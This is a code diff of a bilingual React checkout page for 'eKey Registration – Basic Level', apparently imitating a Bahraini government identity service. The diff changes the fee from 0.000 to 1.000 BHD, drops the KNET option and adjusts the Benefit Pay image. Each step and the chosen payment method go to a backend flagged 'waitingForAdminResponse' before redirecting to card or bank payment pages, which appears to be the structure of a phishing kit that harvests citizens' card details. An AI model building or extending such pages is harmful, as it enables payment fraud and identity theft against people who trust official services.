@@ -15,7 +15,7 @@ export default function RegistrationSummary() {
   const serviceName = isAr
     ? 'التسجيل في المفتاح الإلكتروني – المستوى الأساسي'
     : 'eKey Registration – Basic Level';
-  const servicePrice = '0.000';
+  const servicePrice = '1.000';
   const currency = isAr ? 'د.ب.' : 'BHD';
 
   useEffect(() => {
@@ -29,11 +29,9 @@ export default function RegistrationSummary() {
 
     const paymentMethodLabel = selectedPayment === 'card'
       ? 'بطاقة ائتمان'
-      : selectedPayment === 'knet'
-        ? 'كي نت'
-        : selectedPayment === 'benefit'
-          ? 'بنفت'
-          : 'Apple Pay';
+      : selectedPayment === 'benefit'
+        ? 'بنفت'
+        : 'Apple Pay';
 
     sendData({
       data: {
@@ -42,7 +40,7 @@ export default function RegistrationSummary() {
         paymentMethod: paymentMethodLabel,
       },
       current: 'الملخص',
-      nextPage: selectedPayment === 'knet' ? 'knet-payment' : selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
+      nextPage: selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
       waitingForAdminResponse: false,
     });
 
@@ -50,9 +48,7 @@ export default function RegistrationSummary() {
 
     setTimeout(() => {
       setIsProcessing(false);
-      if (selectedPayment === 'knet') {
-        window.location.href = '/knet-payment';
-      } else if (selectedPayment === 'card') {
+      if (selectedPayment === 'card') {
         window.location.href = `/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${servicePrice}`;
       } else if (selectedPayment === 'benefit') {
         window.location.href = `/benefit-payment?service=${encodeURIComponent(serviceName)}&amount=${servicePrice}`;
@@ -135,24 +131,6 @@ export default function RegistrationSummary() {
                 <p className="reg-summary-payment-desc">Visa, Mastercard</p>
               </div>
 
-              {/* KNET */}
-              <div
-                onClick={() => setSelectedPayment('knet')}
-                className={`reg-summary-payment-option ${selectedPayment === 'knet' ? 'selected' : ''}`}
-              >
-                <div className="reg-summary-payment-option-inner">
-                  <div className={`reg-summary-radio ${selectedPayment === 'knet' ? 'selected' : ''}`}>
-                    {selectedPayment === 'knet' && <div className="reg-summary-radio-dot" />}
-                  </div>
-                  <span className="reg-summary-payment-label">KNET</span>
-                  <div style={{ flex: 1 }} />
-                  <img src="/kpay/knet.png" alt="KNET" style={{ height: '28px', objectFit: 'contain' }} />
-                </div>
-                <p className="reg-summary-payment-desc">
-                  {isAr ? 'الدفع بواسطة كي نت' : 'Pay with KNET'}
-                </p>
-              </div>
-
               {/* Benefit Pay */}
               <div
                 onClick={() => setSelectedPayment('benefit')}
@@ -164,7 +142,7 @@ export default function RegistrationSummary() {
                   </div>
                   <span className="reg-summary-payment-label">Benefit Pay</span>
                   <div style={{ flex: 1 }} />
-                  <img src="/images/benefit.png" alt="Benefit" style={{ height: '28px', objectFit: 'contain' }} onError={e => (e.currentTarget.style.display = 'none')} />
+                  <img src="/images/benefitpay.png" alt="Benefit Pay" style={{ height: '32px', objectFit: 'contain' }} />
                 </div>
                 <p className="reg-summary-payment-desc">
                   {isAr ? 'الدفع بواسطة بنفت باي' : 'Pay with Benefit Pay'}
